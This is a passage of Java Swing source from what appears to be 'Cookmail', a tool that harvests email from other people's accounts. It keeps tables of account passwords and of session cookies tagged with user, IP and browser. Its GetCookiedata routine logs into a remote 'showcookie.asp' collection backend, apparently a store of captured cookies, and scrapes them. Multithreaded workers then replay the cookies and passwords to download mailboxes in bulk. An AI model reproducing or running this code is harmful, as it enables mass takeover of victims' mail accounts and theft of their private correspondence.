                    JOptionPane.showMessageDialog( null, "请不要编辑ID、LastTime、mailNumber、RevState在次尝试！","提示",JOptionPane.ERROR_MESSAGE);
                    this.RefashCookie();
                }
            }
        }
    }//GEN-LAST:event_jButtonEditMouseClicked

    private void jButtonRecvallMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jButtonRecvallMouseClicked
        // TODO add your handling code here:
        int selectTab=jTabbedPaneKind.getSelectedIndex();                       //判断用户选中的标签类型
        if(selectTab==0)
        {
            this.SetRecvType(true);
            this.SetuserAllThreadMark(true);
            this.SetThreadmark(true);
            int usrRowcount=jTable_user.getRowCount();                              //判断表中有无数据
            if(0==usrRowcount)
            {
                JOptionPane.showMessageDialog( null, "该表内没有数据，请先添加数据！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
                for(int i=0;i<usrRowcount;i++)
                {

                    try
                    {
                        DefaultTableModel tableModel = (DefaultTableModel) jTable_user.getModel();
                        Object arg_id = tableModel.getValueAt(i, 0); // 取得第i行第一列的数据
                        ThreadPool.BeginRecThread(arg_id, recvType); //密码收邮线程
                        Thread.sleep(500);
                        this.initTable_User();
                    } 
                    catch (InterruptedException ex)
                    {
                        Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            }
        }
        else
        {
            this.SetRecvType(false);
            this.SetcookieAllThreadMark(true);
            this.SetThreadmark(true);
            int cookieRowcount=jTable_cookie.getRowCount();                            //判断用户是否选中行
            if(-1==cookieRowcount)
            {
                JOptionPane.showMessageDialog( null, "该表内没有数据，请先添加数据！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
                for(int j=0;j<cookieRowcount;j++)
                {
                    try
                    {
                        DefaultTableModel tableModel = (DefaultTableModel) jTable_cookie.getModel();
                        Object arg_id = tableModel.getValueAt(j, 0); // 取得第i行第一列的数据
                        ThreadPool.BeginRecThread(arg_id, recvType); //cookie收邮线程
                        Thread.sleep(500);
                        this.initTable_Cookie();
                    }
                    catch (InterruptedException ex)
                    {
                        Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
            }
        }
    }//GEN-LAST:event_jButtonRecvallMouseClicked

    private void jButtonStopallMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jButtonStopallMouseClicked
        // TODO add your handling code here:
        int selectTab=jTabbedPaneKind.getSelectedIndex();                       //判断用户选中的标签类型
       // JOptionPane.showMessageDialog( null, "这一过程需要比较长的时间，请耐心等待,不要进行其他操作！","提示",JOptionPane.ERROR_MESSAGE);
        if(selectTab==0)
        {
            this.SetRecvType(true);
            int rowCount=jTable_user.getRowCount();                            //判断用户是否选中行
            if(0==rowCount)
            {
                JOptionPane.showMessageDialog( null, "该表内没有数据，请先添加数据！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
               // try
               // {
                    // jTextInfo.setText("you choose one!\n");
                    for (int i = 0; i < rowCount; i++) {
                        try {
                            DefaultTableModel tableModel = (DefaultTableModel) jTable_user.getModel();
                            Object arg_id = tableModel.getValueAt(i, 0); // 取得第i行第一列的数据
                            ThreadPool.AbortAllThread(arg_id, recvType); //密码收邮线程
                            Thread.sleep(500);
                            this.RefashTable();
                        } catch (InterruptedException ex) {
                            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
                        }
                    }
                    //Thread.sleep(5000);
                    //this.SetThreadmark(true);
                   // this.SetuserAllThreadMark(true);
               // }
                //catch (InterruptedException ex) {
                   // Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
               // }
            }
        }
        else
        {
            this.SetRecvType(true);
            int cookieRow=jTable_cookie.getRowCount();                            //判断用户是否选中行
            if(0==cookieRow)
            {
                JOptionPane.showMessageDialog( null, "该表内没有数据，请先添加数据！","提示",JOptionPane.ERROR_MESSAGE);
            }
            else
            {
                //try
                //{
                    // jTextInfo.setText("you choose one!\n");
                    for (int j = 0; j < cookieRow; j++) {
                        try {
                            DefaultTableModel tableModel = (DefaultTableModel) jTable_cookie.getModel();
                            Object arg_id = tableModel.getValueAt(j, 0); // 取得第i行第一列的数据
                            ThreadPool.AbortAllThread(arg_id, recvType); //cookie收邮线程
                            Thread.sleep(500);
                            this.RefashCookie();
                        } catch (InterruptedException ex) {
                            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
                        }
                    }
                   // Thread.sleep(5000);
                    //this.SetThreadmark(true);
                   // this.SetcookieAllThreadMark(true);
              //  }
                //catch (InterruptedException ex)
                //{
                   // Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
               // }
            }
        }
    }//GEN-LAST:event_jButtonStopallMouseClicked

    private void jMenuItemConfigMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jMenuItemConfigMousePressed
        // TODO add your handling code here:
        ConfigureFrame ConfigFrame=new ConfigureFrame(this);
        ConfigFrame.show();
        //设置对话框在窗口中的位置
        ConfigFrame.setLocation((Toolkit.getDefaultToolkit().getScreenSize().width-ConfigFrame.getWidth())/2,
						 (Toolkit.getDefaultToolkit().getScreenSize().height-ConfigFrame.getHeight())/2);
    }//GEN-LAST:event_jMenuItemConfigMousePressed

    private void jMenuItemDatabaseMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jMenuItemDatabaseMousePressed
        // TODO add your handling code here:
        DatabaseSettingFrame database=new DatabaseSettingFrame(this);
        database.show();
        database.setLocation((Toolkit.getDefaultToolkit().getScreenSize().width-database.getWidth())/2,
						 (Toolkit.getDefaultToolkit().getScreenSize().height-database.getHeight())/2);
    }//GEN-LAST:event_jMenuItemDatabaseMousePressed

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton jButtonDel;
    private javax.swing.JButton jButtonEdit;
    private javax.swing.JButton jButtonRecvall;
    private javax.swing.JButton jButtonStopall;
    private javax.swing.JButton jButton_recv;
    private javax.swing.JButton jButtonstop;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JMenu jMenu1;
    private javax.swing.JMenuItem jMenuItemAddcookie;
    private javax.swing.JMenuItem jMenuItemAdduser;
    private javax.swing.JMenuItem jMenuItemConfig;
    private javax.swing.JMenuItem jMenuItemDatabase;
    private javax.swing.JMenuItem jMenuItemRefash;
    private javax.swing.JMenu jMenuSetting;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JTabbedPane jTabbedPaneKind;
    private javax.swing.JTable jTable_cookie;
    private javax.swing.JTable jTable_user;
    private javax.swing.JTextArea jTextInfo;
    private javax.swing.JToolBar jToolBar1;
    private javax.swing.JPanel mainPanel;
    private javax.swing.JMenuBar menuBar;
    private javax.swing.JProgressBar myprogressBar;
    private javax.swing.JLabel statusAnimationuseTime;
    private javax.swing.JLabel statusMessageTime;
    private javax.swing.JPanel statusPanel;
    // End of variables declaration//GEN-END:variables

    private final Timer messageTimer;
    private final Timer busyIconTimer;
    private final Icon idleIcon;
    private final Icon[] busyIcons = new Icon[15];
    private int busyIconIndex = 0;

    private JDialog aboutBox;
    public Statement stmt;
    public ResultSet result;
    public Connection con;
    public static boolean ThreadMark=true;
    public static boolean userAllThreadMark=true;
    public static boolean cookieAllThreadMark=true;
    boolean recvType;
    static String userName = null;                                                 //mysql数据库所在主机用户名
    static String passWord = null;                                                //密码
    static String url = null;                                                 //连接到mysql数据库
    public String MailPath=null;
    public int ThreadNumber=10;
    ThreadPoolManager ThreadPool=null;
    String TimeSpace=null;
    public int CookieTime=5;
    String CookiesiteUrl=null;
    String CookiesitePass=null;
    public  String urls="";
    boolean rectest=false;
    public  String cookiesStr="";
    /**
     * 加载窗体时初始化user table并显示数据库用户名密码数据
     * @return
     */
    @Override
    public DefaultTableModel initTable_User()
    {
        int totalcount=0;                                                       // 列名
        String[] columnNames = {};                                              //要显示的数据
        Object[][] dataRows = null;
        ResultSetMetaData metaData;
        try 
        {
          
            this.Connectdb();
            String sql = "select ID,accounts,PostFix,userMessage,Power,LastTime,MailType,MailNumber,RevState from emailaccounts ";
            result = stmt.executeQuery(sql);
            if(result.next())
            {
                metaData=result.getMetaData();
                int numberOfColumns = metaData.getColumnCount();
                columnNames = new String[numberOfColumns];
                for(int column = 0; column < numberOfColumns; column++)
	        {
                    columnNames[column] = metaData.getColumnLabel(column+1);
            	}
                 
            	if(result.last())
            	{
            		totalcount=result.getRow();	
            	}
		 		
	        result.beforeFirst();                                            //将记录指针回退到最开始处，此时必须将Cursor设置为可回滚
	        dataRows=new Object[totalcount][numberOfColumns];
            	int loopRowCounter=0;                                           //按行读取
            	while(result.next())
	            {
    	        	for(int column = 0; column < numberOfColumns; column++) //column控制列数
        	    	{
            			dataRows[loopRowCounter][column]=result.getObject(column+1);
	            	}
    	        	loopRowCounter++;
        	    }
            }
            
            //disconnectdb();
            
        }
        catch (SQLException ex) 
        {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }
        DefaultTableModel myDefaultTableModel=new DefaultTableModel(dataRows,columnNames);
        
        return myDefaultTableModel;
        
    }
    /**
     * 初始化cookie talbe 并显示emailcookies数据
     * @return
     */
    public DefaultTableModel initTable_Cookie()
    {
        int totalcount=0;                                                       // 列名
        String[] columnNames = {};                                              //要显示的数据
        Object[][] dataRows = null;
        ResultSetMetaData metaData;
        try
        {
            this.Connectdb();
            String sql = "select ID,user,cookie,IP,Date,logo,Browser,RevState,MailType from emailcookies";
            result = stmt.executeQuery(sql);
            if(result.next())
            {
                metaData=result.getMetaData();
                int numberOfColumns = metaData.getColumnCount();
                columnNames = new String[numberOfColumns];
                for(int column = 0; column < numberOfColumns; column++)
	        {
                    columnNames[column] = metaData.getColumnLabel(column+1);
            	}

            	if(result.last())
            	{
            		totalcount=result.getRow();
            	}

	        result.beforeFirst();                                            //将记录指针回退到最开始处，此时必须将Cursor设置为可回滚
	        dataRows=new Object[totalcount][numberOfColumns];
            	int loopRowCounter=0;                                           //按行读取
            	while(result.next())
	            {
    	        	for(int column = 0; column < numberOfColumns; column++) //column控制列数
        	    	{
            			dataRows[loopRowCounter][column]=result.getObject(column+1);
	            	}
    	        	loopRowCounter++;
        	    }
            }


        }
        catch (SQLException ex)
        {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }
        DefaultTableModel myDefaultTableModel=new DefaultTableModel(dataRows,columnNames);
        return myDefaultTableModel;

    }
    /**
     *
     * @param strMsg
     */
    @Override
    public void ShowMessage(String strMsg)
    {
       // JOptionPane.showMessageDialog( null, strMsg);
        if(strMsg!=null||(strMsg == null ? "-1" != null : !strMsg.equals("-1")))
        {
            jTextInfo.append(strMsg+"\r\n");                                      //在提示框中显示提示信息
            writeLog(strMsg+"\r\n");
            this.jTextInfo.selectAll();                                                              //记录日志文件
        }


    }
    /**
     * sava user receive mail log
     * @param content
     */
    public void writeLog(String content)
    {
         try
	      {
                  String path="/日志文件/";
	    	  File directory=new File(".");
	    	  File file = new File(directory.getCanonicalPath()+path);
	    	  if (file.exists())
	    	  {
	    		  //System.out.println("文件夹存在");
	    	  }
	    	  else
	    	  {
	    		 // System.out.println("文件夹不存在，正在创建...");
	    		  if (file.mkdirs())
	    		  {
	    			  	//System.out.println("文件创建成功！");
	    		  }
	    		  else
	    		  {
	    			 // System.out.println("文件创建失败！");
	    		  }
	    	  }
	    	  String fileName="log.txt";
	    	  File newfile=new File(directory.getCanonicalPath()+path+fileName);
	    	  if (!newfile.exists())
	    	  {
	    		  newfile.createNewFile();
	    	  }
	    	  BufferedWriter output = new BufferedWriter(new FileWriter(newfile,true));
		  output.write(content);
		 // output.close();
	    	  output.flush();
	      }
	      catch (Exception e)
	      {
	    	  e.printStackTrace();
	      }
    }

    @Override
    public void Connectdb()
    {
        //读取数据苦配置文件
        ReadDbConf();         //获取数据库用户名、密码及数据库名称
        //开始连接数据库
	try
	{
		Class.forName("com.mysql.jdbc.Driver");                         //.newInstance();	//创建类
		con=DriverManager.getConnection(url,userName,passWord)  ;       //创建连接
		stmt=con.createStatement();
		//result=stmt.executeQuery("select * from user");
		//result.last();
		//totalCount=result.getRow();
		//System.out.print(totalCount);


	}
	catch (ClassNotFoundException e)
	{
		// TODO Auto-generated catch block
		this.ShowMessage("加载JDBC驱动程序失败！");
		e.printStackTrace();

	} catch (SQLException e)
	{
		// TODO Auto-generated catch block
		e.printStackTrace();
		this.ShowMessage("连接数据库失败");

	}

    }
    /**
     * execute select sql
     * @param sql
     * @return line count
     */
    @Override
    public int Excutesql(String sql)
    {
        int count=-1;
        try
	{
		result=stmt.executeQuery(sql);
//                result.last();
                if(result.next())
                {
                    count=result.getInt(1);
                }
              //  count=result.getRow();
               
	}
	catch (SQLException e)
	{
		// TODO Auto-generated catch block
		e.printStackTrace();
	}

        return count;
    }
    /**
     * Disconnect database
     */
    @Override
    public void Disconnectdb() {

        if(con != null)
	{
            try
	{
		con.close();
		stmt.close();
		result.close();
	}
	catch(Exception e)
	{
		e.printStackTrace();
	}
		con = null;
	}
    }

    /**
     *
     * @param sql
     * @return result
     */
    @Override
    public ResultSet ExcuteResult(String sql) {
        try
	{
		result=stmt.executeQuery(sql);

	}
	catch (SQLException e)
	{
		// TODO Auto-generated catch block
		e.printStackTrace();
	}

        return result;

    }
    /**
     * execute insert delete update sql
     * @param sql
     * @return
     */
    @Override
    public int Excutemdl(String sql) {

        int count=-1;
        try
	{
		count=stmt.executeUpdate(sql);
//                result.last();
//                if(result.next())
//                {
//                    count=result.getInt(1);
//                }
              //  count=result.getRow();

	}
	catch (SQLException e)
	{
		// TODO Auto-generated catch block
		e.printStackTrace();
	}

        return count;
    }
    ActionListener taskPerformer = new ActionListener() {
      public void actionPerformed(ActionEvent evt) {
          //...Perform a task...
      }
  };
    /**
     * 初始化控件的属性
     */
    private void initControl() {

        
        //int threadNumber=10;
        ReadUserConfig();
        jTextInfo.setEditable(false);
        ThreadPool=new ThreadPoolManager(ThreadNumber,this);

        Date now = new Date(System.currentTimeMillis());
	DateFormat date = DateFormat.getDateTimeInstance();
	String addtime = date.format(now);
        //String sql="insert into logsystem(logid,loginUser,loginDate) values (null,vip,'"+addtime+"')";
        //this.Excutesql(sql);
        this.statusMessageTime.setText("Cookmail V2.1.2");
        this.jLabel1.setText(" 本次运行 ： "+addtime);
        this.statusAnimationuseTime.setText("https://github.com/Cryin/Cookmail");
//        if(!CookiesiteUrl.isEmpty())
//        {
//            ActionListener taskAction=new ActionListener( )
//            {
//                public void actionPerformed(ActionEvent e) 
//                {
//                    GetCookiedata();
//                    GetqqCookiedata();
//                    RecvAllAutoMail();//}
//                }
//            };
//                 new Timer(CookieTime,taskAction).start();
//        }

    }
    /**
     * 刷新user table
     */
    @Override
    public void RefashTable() {
        int totalcount=0;                                                       // 列名
        String[] columnNames = {};                                              //要显示的数据
        Object[][] dataRows = null;
        ResultSetMetaData metaData;
        try
        {

            this.Connectdb();
            String sql = "select ID,accounts,PostFix,userMessage,Power,LastTime,MailType,MailNumber,RevState from emailaccounts ";
            result = stmt.executeQuery(sql);
            if(result.next())
            {
                metaData=result.getMetaData();
                int numberOfColumns = metaData.getColumnCount();
                columnNames = new String[numberOfColumns];
                for(int column = 0; column < numberOfColumns; column++)
	        {
                    columnNames[column] = metaData.getColumnLabel(column+1);
            	}

            	if(result.last())
            	{
            		totalcount=result.getRow();
            	}

	        result.beforeFirst();                                            //将记录指针回退到最开始处，此时必须将Cursor设置为可回滚
	        dataRows=new Object[totalcount][numberOfColumns];
            	int loopRowCounter=0;                                           //按行读取
            	while(result.next())
	            {
    	        	for(int column = 0; column < numberOfColumns; column++) //column控制列数
        	    	{
            			dataRows[loopRowCounter][column]=result.getObject(column+1);
	            	}
    	        	loopRowCounter++;
        	    }
            }

            //disconnectdb();

        }
        catch (SQLException ex)
        {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }
        DefaultTableModel myDefaultTableModel=new DefaultTableModel(dataRows,columnNames);
        this.jTable_user.setModel(myDefaultTableModel);
    }
    /**
     * 刷新cookie table
     */
    @Override
    public void RefashCookie() {
        int totalcount=0;                                                       // 列名
        String[] columnNames = {};                                              //要显示的数据
        Object[][] dataRows = null;
        ResultSetMetaData metaData;
        try
        {
            this.Connectdb();
            String sql = "select ID,user,cookie,IP,Date,logo,Browser,RevState,MailType from emailcookies";
            result = stmt.executeQuery(sql);
            if(result.next())
            {
                metaData=result.getMetaData();
                int numberOfColumns = metaData.getColumnCount();
                columnNames = new String[numberOfColumns];
                for(int column = 0; column < numberOfColumns; column++)
	        {
                    columnNames[column] = metaData.getColumnLabel(column+1);
            	}

            	if(result.last())
            	{
            		totalcount=result.getRow();
            	}

	        result.beforeFirst();                                            //将记录指针回退到最开始处，此时必须将Cursor设置为可回滚
	        dataRows=new Object[totalcount][numberOfColumns];
            	int loopRowCounter=0;                                           //按行读取
            	while(result.next())
	            {
    	        	for(int column = 0; column < numberOfColumns; column++) //column控制列数
        	    	{
            			dataRows[loopRowCounter][column]=result.getObject(column+1);
	            	}
    	        	loopRowCounter++;
        	    }
            }


        }
        catch (SQLException ex)
        {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }
        DefaultTableModel myDefaultTableModel=new DefaultTableModel(dataRows,columnNames);
        this.jTable_cookie.setModel(myDefaultTableModel);
    }

    /**
     * 获取单个线程的运行状态
     * @return
     */
    @Override
    public boolean GetThreadmark() {

        return ThreadMark;
    }
    /**
     * 设置单个线程运行状态
     * @param mark
     */
    @Override
    public void SetThreadmark(boolean mark) {
        ThreadMark=mark;

    }
    /**
     * 获取收邮类别
     * @return
     */
    @Override
    public boolean GetRecvType() {

        return recvType;
    }

    @Override
    public void SetRecvType(boolean Rectype) {

        recvType=Rectype;
    }
    /**
     * 设置所有线程的状态
     * @param allmark
     */
    @Override
    public void SetuserAllThreadMark(boolean allmark) {
        userAllThreadMark=allmark;

    }

    @Override
    public boolean GetuserAllThreadMark() {
        return userAllThreadMark;
    }

    @Override
    public void SetcookieAllThreadMark(boolean allmark) {
        cookieAllThreadMark=allmark;

    }

    @Override
    public boolean GetcookieAllThreadMark() {

        return cookieAllThreadMark;
    }
    /**
    *
    * @param message 字符串
    * @param startStr 起始字符
    * @param endStr 末尾字符
    * @param startIndex 字符串起始位置
    * @return 两个字符串之间的数据
    */
    public String putstr(String message, String startStr, String endStr,
			int startIndex) // 取两个字符串之间的数据
    {
	if (startIndex < 0)
		return "-1";
	if (message.length() < startIndex)
		return "-1";
	String subStr = message.substring(startIndex, message.length());
	int indexStar = subStr.indexOf(startStr);
	if (indexStar < 0)
		return "-1";
	indexStar += startStr.length();
	subStr = subStr.substring(indexStar, subStr.length());
	int indexEnd = subStr.indexOf(endStr);
	if (indexEnd < 0)
		return "-1";
	return subStr.substring(0, indexEnd);
    }
    /**
     * 读取数据苦配置文件
     */
    private void ReadDbConf() {

        //读取数据苦配置文件
        try
        {
            File directory=new File(".");
            String filepath="/database.conf";
            File file = new File(directory.getCanonicalPath() + filepath);
            if (file.exists())
            {
	    	BufferedReader reader=new BufferedReader(new FileReader(file));
                String strTemp = null;
                int line = 1;
                //按行读取文件，直到读入null为文件结束
                while ((strTemp = reader.readLine()) != null)
                {
                    if(line==1)
                    {
                        userName=putstr(strTemp,"user: ",";",0).trim();
                    }
                    if(line==2)
                    {
                        passWord=putstr(strTemp,"password: ",";",0).trim();
                    }
                    if(line==3)
                    {
                        url=putstr(strTemp,"url: ",";",0).trim();
                    }
                    line++;
                }
                reader.close();
            }
	    else
            {
                JOptionPane.showMessageDialog(null, "database.conf 配置文件不存在！");
               // return;
            }
        }
        catch (IOException ex)
        {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private void ReadUserConfig() {
        //读取用户配置文件
        try
        {
            File directory=new File(".");
            String filepath="/user.conf";
            File file = new File(directory.getCanonicalPath() + filepath);
            if (file.exists())
            {
	    	BufferedReader reader=new BufferedReader(new FileReader(file));
                String strTemp = null;
                int line = 1;
                //按行读取文件，直到读入null为文件结束
                while ((strTemp = reader.readLine()) != null)
                {
                    if(line==1)
                    {
                        MailPath=putstr(strTemp,"Mail Path: ",";",0).trim();
                    }
                    if(line==2)
                    {
                        TimeSpace=putstr(strTemp,"Time Space: ",";",0).trim();
                       CookieTime=Integer.parseInt(TimeSpace)*1000*60;
                       //CookieTime=Integer.parseInt(TimeSpace)*4000;
                    }
                    if(line==3)
                    {
                        String Threadno=putstr(strTemp,"Max ThreadNumber: ",";",0).trim();
                        ThreadNumber=Integer.parseInt(Threadno);
                        
                    }
                    if(line==4)
                    {
                        CookiesiteUrl=putstr(strTemp,"CookieUrl: ",";",0).trim();
                        
                    }
                   /* if(line==5)
                    {
                       // CookiesitePass=putstr(strTemp,"password: ",";",0).trim();
                        cookiesStr=putstr(strTemp,"password: ",";",0).trim();
                        
                    }*/
                    line++;
                }
                reader.close();
            }
	    else
            {
                JOptionPane.showMessageDialog(null, "user.conf 配置文件不存在！");
               // return;
            }
        }
        catch (IOException ex)
        {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

    @Override
    public String GetMailPath() {

        return MailPath;
    }
    /**
    * Get
    * @param url
    * @return
    * @throws HttpException
    * @throws IOException
    */
    private String getRequest(String url) throws HttpException, IOException
    {
		//
		MultiThreadedHttpConnectionManager connectionManager = new MultiThreadedHttpConnectionManager();
		HttpClient httpClient = new HttpClient(connectionManager);
		httpClient.getParams().setCookiePolicy(
				CookiePolicy.BROWSER_COMPATIBILITY);
		//
		GetMethod getMethod = new GetMethod(url);
		getMethod.getParams().setParameter(
				HttpMethodParams.SINGLE_COOKIE_HEADER, true);
		if (cookiesStr != "")
		{
			getMethod.setRequestHeader("Cookie", cookiesStr);
		}
		getMethod.setRequestHeader("Content-Type",
				"application/x-www-form-urlencoded");
		getMethod.setRequestHeader("User-Agent",
				"Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0");
		getMethod.setRequestHeader("Accept-Language", "en-us,ar-SA;q=0.9,de-DE;q=0.8,es-ES;q=0.7,tr-TR;q=0.6,ja-JP;q=0.5,en-GB;q=0.4,fr-FR;q=0.3,zh-CN;q=0.2,zh-TW;q=0.1");
		String requestStr = new String();
		StringBuffer resultBuffer = new StringBuffer();
		try
		{
			//
			int statusCode = httpClient.executeMethod(getMethod);
			if (statusCode != HttpStatus.SC_OK)
			{
				this.ShowMessage("Request Method failed: "
						+ getMethod.getStatusLine());
			}
			//
			BufferedReader in = new BufferedReader(new InputStreamReader(
					getMethod.getResponseBodyAsStream(), getMethod
							.getResponseCharSet()));
			URI uri = getMethod.getURI();
			urls = uri.getURI();
			String inputLine = null;
			while ((inputLine = in.readLine()) != null)
			{
				resultBuffer.append(inputLine);
				resultBuffer.append("\n");
			}
			requestStr = resultBuffer.toString();
			Cookie[] cookiesTemp = httpClient.getState().getCookies();
			if (cookiesTemp != null && cookiesTemp.length > 0)
			{
				for (int i = 0; i < cookiesTemp.length; i++)
				{
					if (cookiesStr == "")
					{
						cookiesStr += cookiesTemp[i].getName() + "="
								+ cookiesTemp[i].getValue() + "; ";
					}
					else
					{
						if (cookiesStr.endsWith("; "))
						{
							cookiesStr += cookiesTemp[i].getName() + "="
									+ cookiesTemp[i].getValue() + "; ";
						}
						else
						{
							cookiesStr += "; " + cookiesTemp[i].getName() + "="
									+ cookiesTemp[i].getValue();
						}
					}
				}
			}
		}
		catch (HttpException e)
		{
			//
			this.ShowMessage("Please check your provided http address!");
			e.printStackTrace();
		}
		catch (IOException e)
		{
			//
			e.printStackTrace();
		}
		finally
		{
			//
			getMethod.releaseConnection();
		}
		return requestStr;
	}
	/**
	 *
	 * @param url
	 * @param InData
	 * @return Post Response
	 * @throws HttpException
	 * @throws IOException
	 */
	private String postRequest(String url, NameValuePair[] InData) throws HttpException, IOException
	{

		String html = "";
		StringBuffer resultBuffer = new StringBuffer();
		MultiThreadedHttpConnectionManager connectionManager = new MultiThreadedHttpConnectionManager();
		HttpClient httpClient = new HttpClient(connectionManager);
		httpClient.getParams().setCookiePolicy(
				CookiePolicy.BROWSER_COMPATIBILITY);
		PostMethod postMethod = new PostMethod(url);

		postMethod.setRequestHeader("Accept", "*/*");
		postMethod.setRequestHeader("Connection", "Keep-Alive");
		postMethod.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0");
		postMethod.setRequestHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
		if (cookiesStr != "")
		{
			postMethod.setRequestHeader("Cookie", cookiesStr);
		}
		postMethod.setRequestBody(InData);
		int statusCode = httpClient.executeMethod(postMethod);
		//
		//
		if ((statusCode == HttpStatus.SC_MOVED_TEMPORARILY)
				|| (statusCode == HttpStatus.SC_MOVED_PERMANENTLY)
				|| (statusCode == HttpStatus.SC_SEE_OTHER)
				|| (statusCode == HttpStatus.SC_TEMPORARY_REDIRECT))
		{
			Header locationHeader = postMethod.getResponseHeader("location");
			String location = null;
			if (locationHeader != null)
			{
				location = locationHeader.getValue();
				if (location.startsWith("http"))
				{
					GetMethod getMethod = new GetMethod(url);
					statusCode = httpClient.executeMethod(getMethod);

					if (statusCode != HttpStatus.SC_OK)
					{
						this.ShowMessage("Request Method failed: "
								+ getMethod.getStatusLine());
					}
					//
					BufferedReader in = new BufferedReader(
							new InputStreamReader(getMethod
									.getResponseBodyAsStream(), getMethod
									.getResponseCharSet()));
					URI uri = getMethod.getURI();
					urls = uri.getURI();
					String inputLine = null;
					while ((inputLine = in.readLine()) != null)
					{
						resultBuffer.append(inputLine);
						resultBuffer.append("\n");
					}
					html = resultBuffer.toString();

					//System.out.println("The page was redirected to:" + location);
				}
				else
				{
					url = "http://" + postMethod.getURI().getHost() + location;
					GetMethod getMethod = new GetMethod(url);
					statusCode = httpClient.executeMethod(getMethod);

					if (statusCode != HttpStatus.SC_OK)
					{
						this.ShowMessage("Request Method failed: "
								+ getMethod.getStatusLine());
					}
					//
					BufferedReader in = new BufferedReader(
							new InputStreamReader(getMethod
									.getResponseBodyAsStream(), getMethod
									.getResponseCharSet()));
					URI uri = getMethod.getURI();
					urls = uri.getURI();
					String inputLine = null;
					while ((inputLine = in.readLine()) != null)
					{
						resultBuffer.append(inputLine);
						resultBuffer.append("\n");
					}
					html = resultBuffer.toString();
					//System.out.println("The page was error:" + location);
				}

				return html;

			}
                        else
                        {
				this.ShowMessage("Location field value is null.");
			}
			return html;
		}
		BufferedReader in = new BufferedReader(new InputStreamReader(postMethod
				.getResponseBodyAsStream(), postMethod.getResponseCharSet()));
		StringBuffer strBuffer = new StringBuffer();
		String inputLine = null;
		while ((inputLine = in.readLine()) != null)
		{
			strBuffer.append(inputLine);
			strBuffer.append("\n");
		}
		html = strBuffer.toString();
		in.close();
		Cookie[] cookiesTemp = httpClient.getState().getCookies();
		if (cookiesTemp != null && cookiesTemp.length > 0)
		{
			for (int i = 0; i < cookiesTemp.length; i++)
			{
				if (cookiesStr == "")
				{
					cookiesStr += cookiesTemp[i].getName() + "="
						+ cookiesTemp[i].getValue() + "; ";
				}
				else
				{
					if (cookiesStr.endsWith("; "))
					{
						cookiesStr += cookiesTemp[i].getName() + "="
							+ cookiesTemp[i].getValue() + "; ";
					}
					else
					{
						cookiesStr += "; " + cookiesTemp[i].getName() + "="
							+ cookiesTemp[i].getValue();
					}
				}
			}
		}

//		System.out.println("---------------------------------->Post Cookies:");
//		for (Cookie cookie : cookiesTemp)
//		{
//
//			System.out.println(cookie.getName());
//			System.out.println(cookie.getValue());
//		}
//		System.out.println("---------------------------------->Post Cookies:");


		postMethod.releaseConnection();
		return html;
	}
     /**
    * get cookie from cookie site
    */
    public void GetCookiedata() {
        
	String strHtml = "";
        String CookieHtml="";
	int index=0; 
        int cookieindex;
        int typeindex;
        int sqlbool;
        String LoginUrl="";
        String encoding = "UTF-8";
        LoginUrl = CookiesiteUrl.replace("showcookie.asp", "logincookie.asp");
        
        
        rectest=false;
	try {
            
            CookieHtml = getRequest(LoginUrl);
        if(CookieHtml.indexOf("location='showcookie.asp")!=-1)
        {
            ShowMessage("系统提示:自动获取后台cookie");
        }
                CookiesiteUrl=CookiesiteUrl+"?page=1";
		CookieHtml = getRequest(CookiesiteUrl);
		if (CookieHtml.indexOf("showcookie.asp") != -1) 
                {
                    String urltemp="";
                    String sid="";
                    String cookiedata="";
                    String user="";
                    String ip="";
                    String browser="";
                    String logo="";
                    String MailType="";
                    Date now = new Date(System.currentTimeMillis());
                     DateFormat date = DateFormat.getDateTimeInstance();
                     String Date = date.format(now);
                     
                     
                     int RevLogo=0;
                     int Revstate=0;
                   // CookiesiteUrl=CookiesiteUrl.replace("logincookie.asp", "showcookie.asp");
                   // strHtml = getRequest(CookiesiteUrl);
                    while ((index = CookieHtml.indexOf("<tr align=\"center\">",index)) != -1) 
                    {
                       // CookieHtml = putstr(CookieHtml, "align=\"center\">", "type=\"submit\"", index);
                        browser = putstr(CookieHtml, "id=\"ID\" value=\"", "\"", index);
                        if(browser=="-1")
                            return;
                        strHtml = putstr(CookieHtml, "<td width=\"50", "</tr>", index);
			
                        if ((cookieindex = strHtml.indexOf("<td")) != -1)
                        {
                            user = putstr(strHtml, "#FFFFFF\">", "</td>", cookieindex+50);
                        }
                       
